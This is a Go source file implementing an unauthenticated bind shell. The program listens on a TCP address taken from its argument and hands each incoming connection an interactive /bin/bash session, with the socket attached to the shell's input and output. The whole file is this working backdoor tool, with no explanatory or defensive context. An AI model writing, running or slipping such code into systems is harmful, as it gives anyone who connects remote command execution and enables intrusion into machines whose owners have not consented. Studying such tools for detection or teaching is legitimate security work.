package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func Handleconnection(conn net.Conn) {
	var shell = "/bin/bash"
	_, _ = conn.Write([]byte("Bind Shell\n"))
	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	_ = command.Run()
}

func main(){
	var addr string

	if len(os.Args) != 2 {
		fmt.Println("Wrong number of arguments")
		os.Exit(1)
	}

	addr = os.Args[1]

	listener, err := net.Listen("tcp", addr)

	if err != nil{
		fmt.Println("Error connecting...")
	}

	for {
		conn, err := listener.Accept()

		if err != nil{
			fmt.Println("Error accepting:...")
		}
		go Handleconnection(conn)
	}
}